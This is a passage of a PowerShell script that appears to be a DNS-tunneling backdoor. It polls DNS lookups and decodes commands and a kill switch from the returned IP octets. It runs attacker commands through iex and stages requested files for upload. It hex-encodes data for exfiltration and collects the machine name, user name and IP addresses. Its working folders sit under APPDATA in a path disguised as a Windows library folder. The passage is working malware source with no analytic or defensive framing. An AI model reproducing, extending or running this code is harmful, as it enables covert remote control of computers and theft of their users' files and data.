 			Write-Host "$($currentChunk)`t$($lastAddress)" 
 			try 
 			{ 
 				$resultTmp = [System.Net.Dns]::GetHostAddresses($lastAddress); 
 			} 
 			catch { Write-Host "excepton occured!"; ${global:$exception_countersss} = ${global:$exception_countersss} + 1; continue; } 
 			 
 			if ($resultTmp -eq $null) { ${global:$exception_countersss} = ${global:$exception_countersss} + 1;continue } 
 			$result = $resultTmp[0].IPAddressToString; 
 			$result_spilitedsss = $result.Split('.'); 
 			Write-Host "$($countersss):$($result_spilitedsss[3])`tsaveing_mode: $($saveing_moodsss)`t   $($result_spilitedsss[0]) $($result_spilitedsss[1]) $($result_spilitedsss[2])" 
 			 
 			if (($result_spilitedsss[0] -eq 1) -and ($result_spilitedsss[1] -eq 2) -and ($result_spilitedsss[2] -eq 3)) 
 			{ 
 				$countersss = [int]$result_spilitedsss[3]; 
 			} 
 			 
 			if (($result_spilitedsss[0] -eq 11) -and ($result_spilitedsss[1] -eq 24) -and ($result_spilitedsss[2] -eq 237) -and ($result_spilitedsss[3] -eq 110)) # kill this process 
 			{ 
 				$bulk = 0 
 				${global:$run} = $false; 
 				${global:$exception_countersss} = ${global:$exception_countersss} + 3; 
 				del $tmpAddress; 
 			} 
 		} 
 	} 
 } 
  
 function slaber 
 { 
 	Param ($filePath) 
 	if ((Get-Item $filePath).length -gt 600kb) 
 	{ 
 		"result size exceeded the maximum size and it deleted" | Set-Content $filePath; 
 	} 
 	$file = Get-Content $filePath -Encoding Byte; 
 	$encoded = resolver($file); 
 	return $encoded; 
 } 
 function resolver ($byte_array) 
 { 
 	$cnt = 0; 
 	$p1 = ""; 
 	$p2 = ""; 
 	for ($i = 0; $i -lt $byte_array.Length; $i++) 
 	{ 
 		if ($cnt -eq 30) 
 		{ 
 			$cnt = 0; 
 			$res += ($p1 + $p2); 
 			$p1 = ""; $p2 = ""; 
 		} 
 		$tmp = [System.BitConverter]::ToString($byte_array[$i]).Replace("-", ""); 
 		$p1 += $tmp[0]; 
 		$p2 += $tmp[1]; 
 		$cnt++; 
 	} 
 	$res += ($p1 + $p2); 
 	return $res; 
 } 
 function processor 
 { 
 	$files_list = @(Get-ChildItem -Path ${global:$receive_box} | Where-Object { !$_.PSIsContainer }); 
 	if ($files_list -ne $null) 
 	{ 
 		$tmpAddress = ${global:$receive_box} + "\" + $files_list[0]; 
 		$newTmpAddress3sss = $tmpAddress -replace "receivebox", "sendbox"; 
 		 
 		if ($tmpAddress.EndsWith("0")) 
 		{ 
 			$file_content = Get-Content $tmpAddress | ? { $_.trim() -ne "" }; 
 			$output_path = ${global:$send_box} + "\" + $files_list[0]; 
 			$file_content = $file_content.Trim(); 
 			($file_content.replace("&", ";") + " 2>&1") | iex | Out-File $output_path -Encoding UTF8 
 			if (Test-Path -Path $tmpAddress) 
 			{ 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 		elseif ($tmpAddress.EndsWith("1")) 
 		{ 
 			$fileAddr2Down = Get-Content $tmpAddress | ? { $_.trim() -ne "" } | %{ $_.Replace("`0", "").Trim() } 
 			if (Test-Path -Path $fileAddr2Down) 
 			{ 
 				$output_path = ${global:$send_box} + "\" + $files_list[0]; 
 				Copy-Item -path $fileAddr2Down -destination $output_path -Force; 
 			} 
 			else 
 			{ 
 				"File not exist" | Set-Content $newTmpAddress3sss; 
 			} 
 			if (Test-Path -Path $tmpAddress) 
 			{ 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 		elseif ($tmpAddress.EndsWith("2")) 
 		{ 
 			$newTmpAddress2 = $tmpAddress -replace "receivebox", "done"; 
 			Move-Item -path $tmpAddress -destination $newTmpAddress2 -Force; 
 			if (Test-Path -Path $newTmpAddress2) 
 			{ 
 				("200<>" + $newTmpAddress2) | Set-Content $newTmpAddress3sss; 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 		elseif ($tmpAddress.EndsWith("3")) 
 		{ 
 			getInfo | Out-File -Encoding 'UTF8' -FilePath "$(${global:$send_box})\00inf"; 
 			if (Test-Path -Path $tmpAddress) 
 			{ 
 				Remove-Item -path $tmpAddress; 
 			} 
 		} 
 	} 
 } 
 function getInfo 
 { 
 	$ip = @(); 
 	Get-WmiObject win32_networkadapterconfiguration | ? { $_.IPAddress -ne $null } | Sort-Object IPAddress -Unique | % { $ip += $_.IPAddress }; 
 	$whoam = "$($env:COMPUTERNAME)/$($env:USERNAME)"; 
 	return "$(${global:$aidsss})<>$($whoam)<>$(([string]::Join(",", $ip)).Trim())<>${global:$myPathsss}"; 
 } 
 if ((Get-WmiObject Win32_Process -Filter ("CommandLine LIKE '%"+$MyInvocation.MyCommand.Name.Trim()+"%'")).length -lt 10) { 
 	${global:$root_path} = $env:APPDATA + "\Windows\Libraries\" + ${global:$aidsss}; 
 	${global:$receive_box} = ${global:$root_path} + "\receivebox"; 
 	${global:$send_box} = ${global:$root_path} + "\sendbox"; 
 	${global:$done_box} = ${global:$root_path} + "\done"; 
 	if (-not (Test-Path -Path ${global:$root_path}) -or -not (Test-Path -Path ${global:$send_box})) 
 	{ 
 		md ${global:$root_path}; 
 		md ${global:$send_box}; 
 		md ${global:$receive_box}; 
 		md ${global:$done_box}; 
 		getInfo; 
 	} 
 	receive; 
 	processor; 
 	send; 
 }
